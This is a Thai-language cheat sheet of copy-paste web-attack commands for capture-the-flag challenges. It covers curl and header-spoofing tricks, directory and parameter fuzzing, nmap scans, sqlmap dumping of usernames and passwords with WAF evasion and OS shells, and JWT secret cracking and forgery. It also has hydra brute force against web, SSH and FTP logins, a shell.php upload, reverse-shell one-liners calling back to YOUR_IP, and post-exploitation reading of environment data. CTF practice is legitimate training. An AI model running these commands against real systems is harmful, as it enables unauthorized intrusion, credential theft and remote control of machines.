# Web Commands — คำสั่งพร้อมใช้ (คัดลอกได้เลย)

> ทุกคำสั่งใช้กับ target ของโจทย์เท่านั้น
> เปลี่ยน `target` เป็น IP/โดเมนจริงก่อนรัน

---

## 1) ตั้งค่าพื้นฐาน

```bash
T=http://target:8080          # ตั้งตัวแปร เพื่อพิมพ์สั้น
T=https://target

# เก็บ cookie ไว้ใช้ต่อ
curl -s -c c.txt "$T/login" -d 'user=a&pass=b' -o /dev/null
curl -s -b c.txt "$T/dashboard"
```

---

## 2) curl — ใช้ให้ครบทุกท่า

```bash
curl -i "$T/"                                  # เห็น header + body
curl -s -I "$T/"                               # เฉพาะ header
curl -s -L "$T/"                               # ตาม redirect
curl -s -k "$T/"                               # ข้าม cert ที่ผิด (https)
curl -s --max-time 5 "$T/"                     # กันค้าง

# method ต่าง ๆ
curl -s -X POST "$T/api" -H 'Content-Type: application/json' -d '{"a":1}'
curl -s -X PUT  "$T/api/1" -d '{"role":"admin"}'
curl -s -X OPTIONS -i "$T/api"

# ใส่ header แปลก ๆ
curl -s -H 'X-Forwarded-For: 127.0.0.1' "$T/admin"
curl -s -H 'X-Original-URL: /admin' "$T/"
curl -s -A 'Mozilla/5.0' "$T/"

# อัปโหลดไฟล์
curl -s -F 'file=@shell.php' "$T/upload.php"

# วัดผลเทียบกัน
for p in / /admin /login /flag; do
  printf '%-10s ' "$p"; curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "$T$p"
done
```

---

## 3) ffuf — หา path / parameter / vhost

```bash
# path
ffuf -u "$T/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,204,301,302,401,403 -t 40

# ซ่อนผลที่ไม่สนใจ (กรอง 404 ที่ size เท่ากัน)
ffuf -u "$T/FUZZ" -w wordlist.txt -fs 0,1234

# parameter (หา param ที่ซ่อน)
ffuf -u "$T/page.php?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

# ค่า param (เช่น id)
ffuf -u "$T/page.php?id=FUZZ" -w numbers.txt

# subdomain / vhost
ffuf -u http://FUZZ.target.com -w subdomains.txt
ffuf -u "$T" -H 'Host: FUZZ.target' -w subdomains.txt -fs 0

# บันทึกผล
ffuf -u "$T/FUZZ" -w wordlist.txt -o ffuf.json -of json
```

---

## 4) feroxbuster / gobuster

```bash
feroxbuster -u "$T" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
            -x php,html,txt,bak,zip -t 40

gobuster dir -u "$T" -w /usr/share/wordlists/dirb/common.txt \
             -x php,txt,html -s 200,204,301,302,403 -t 40
gobuster vhost -u "$T" -w subdomains.txt
```

---

## 5) katana — crawl เก็บ link ทั้งเว็บ

```bash
katana -u "$T" -d 3 -o urls.txt
katana -u "$T" -d 3 -jc -o urls_js.txt      # -jc = เก็บ JS ด้วย
sort -u urls.txt | grep -v -E '\.(png|jpg|css|woff)' | head -50
```

---

## 6) nmap — ดูว่าเป้าหมายเปิดอะไร

```bash
nmap -sV -sC target
nmap -p- --min-rate 1000 target
nmap -sV -p 80,443,8080,8000,3000,5000 target
```

---

## 7) sqlmap

```bash
# GET
sqlmap -u "$T/item.php?id=1" --batch --dbs

# POST
sqlmap -u "$T/login.php" --data="user=a&pass=b" --batch --dbs

# จาก request ที่บันทึกด้วย Burp (แม่นสุด)
sqlmap -r request.txt --batch --dbs

# ระบุ DB/Table
sqlmap -u "$T/item.php?id=1" --batch -D app -T users --columns
sqlmap -u "$T/item.php?id=1" --batch -D app -T users -C username,password --dump

# ตัวเลือกที่มีประโยชน์
--level=5 --risk=3        # ลึกขึ้น (ระวัง)
--technique=U             # union only
--tamper=space2comment    # หลบ WAF
--os-shell                # ใช้เมื่อจำเป็นจริง ๆ
```

---

## 8) jwt_tool

```bash
jwt_tool <token>                                   # ถอด + ตรวจ
jwt_tool <token> -T                                # โหมดแก้ (interactive)
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt   # crack secret
jwt_tool <token> -S hs256 -p '<secret>' -I -pc role -pv admin
jwt_tool <token> -X a                              # ลอง alg=none / kid injection
```

**ถอด JWT ด้วยมือ (ไม่ต้องพึ่ง tool):**

```bash
python3 - <<'PY'
import base64, json, sys
tok = "<paste token>"
for i, part in enumerate(tok.split(".")[:2]):
    pad = "=" * (-len(part) % 4)
    print(("HEADER","PAYLOAD")[i], json.dumps(json.loads(base64.urlsafe_b64decode(part + pad)), indent=2))
PY
```

---

## 9) Burp Suite CE — ตั้งค่าเร็ว

```
1. เปิด Burp → Proxy → Options → 127.0.0.1:8080
2. ตั้ง browser proxy (หรือใช้ FoxyProxy)
3. เปิด Intercept → ดู request
4. คลิกขวา → Send to Repeater (แก้แล้วส่งซ้ำ)
5. คลิกขวา → Copy as curl (เอาไปรันใน terminal)
6. ถ้าเป็น HTTPS ให้ติดตั้ง CA: http://burp → Download certificate
```

**บันทึก request ไปให้ sqlmap:**

```
ใน Burp: คลิกขวาที่ request → Save item → request.txt
แล้ว: sqlmap -r request.txt --batch --dbs
```

---

## 10) hydra — brute force login (ใช้เมื่อโจทย์อนุญาต)

```bash
# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt target \
      http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"

# HTTP Basic auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /admin

# SSH / FTP (ถ้าโจทย์เป็นแนว network)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target
```

> เช็กก่อนว่าโจทย์ไม่ได้จำกัด rate — ยิงถี่เกินอาจโดน ban

---

## 11) Reverse shell (เมื่อได้ command injection / RCE)

```bash
# ฝั่งเรา
nc -lvnp 4444

# bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# netcat
nc -e /bin/sh YOUR_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
```

ในช่อง input ที่จำกัดความยาว ให้ใช้ URL encode:

```bash
python3 -c "import urllib.parse;print(urllib.parse.quote('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'))"
```

---

## 12) อ่าน flag หลังได้ RCE

```bash
ls -la /; cat /flag*; cat /flag.txt; find / -name '*flag*' -maxdepth 3 2>/dev/null
env; cat /proc/self/environ | tr '\0' '\n' | grep -i flag
```

---

## 13) บันทึกหลักฐาน (สำหรับ writeup)

```bash
script -a session.log            # บันทึกทุกคำสั่งใน terminal
curl -s "$T/" -o page.html       # เก็บหน้าเว็บ
ffuf ... -o ffuf.json -of json   # เก็บผลสแกน
```

---

## 14) แก้ปัญหาที่เจอบ่อย

| อาการ | สาเหตุ/วิธีแก้ |
|---|---|
| `curl: (7) Failed to connect` | target ไม่ขึ้น / port ผิด → `nmap -p- target` |
| 403 ทุก path | อาจต้องใส่ header (`X-Forwarded-For`) หรือมี WAF |
| 302 ไปหน้า login ตลอด | ต้องมี cookie → ใช้ `-b c.txt` |
| ffuf ได้ 200 ทุกอย่าง | หน้า error ตอบ 200 → ใส่ `-fs <size>` กรอง |
| sqlmap ไม่เจอ | ลอง `--level=5 --risk=3`, หรือใช้ `-r request.txt` |
| JWT ใช้ไม่ได้หลังแก้ | signature ไม่ถูก → ต้องเซ็นใหม่ด้วย `jwt_tool -S` |
